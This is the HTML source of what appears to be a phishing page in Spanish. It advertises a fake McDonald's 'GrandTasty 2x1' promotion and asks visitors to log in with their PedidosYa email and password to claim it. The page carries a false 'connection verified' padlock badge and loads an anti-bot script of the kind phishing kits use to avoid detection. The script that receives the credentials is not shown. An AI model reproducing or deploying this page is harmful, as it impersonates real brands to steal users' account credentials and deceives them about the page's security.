<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Promoción exclusiva 2x1 GrandTasty por solo $18,000. Colaboración especial.">
    <title>GrandTasty 2x1 - Promoción Especial</title>
    <link rel="stylesheet" href="css/style.css">
    <script src="js/antibot.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <img src="assets/logo.png" alt="McDonald's GrandTasty" class="logo">
            <h1>Promoción Exclusiva: 2x1 GrandTasty</h1>
            <p class="price">Solo $18,000</p>
        </header>

        <section class="promo-details">
            <p>Disfruta de la colaboración más esperada del año. Dos hamburguesas GrandTasty por el precio de una. Oferta válida por tiempo limitado.</p>
            <img src="assets/hamburguesa.jpg" alt="Hamburguesa GrandTasty" class="promo-img"> 
        </section>

        <form id="loginForm" class="login-form">
            <!-- IMAGEN LOCAL DE PEDIDOSYA -->
            <div style="text-align: center; margin-bottom: 15px;">
                <img src="assets/pedidosya.png" alt="PedidosYa" style="height: 40px; width: auto;">
            </div>
            
            <h2>Inicia sesión con tu cuenta de PEDIDOS YA</h2>
            <input type="email" id="email" placeholder="Correo electrónico (Gmail)" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit">Reclamar Oferta</button>
            <p class="secure-text">🔒 Conexión segura verificada</p>
        </form>
    </div>

    <script src="js/logic.js"></script>
</body>
</html>
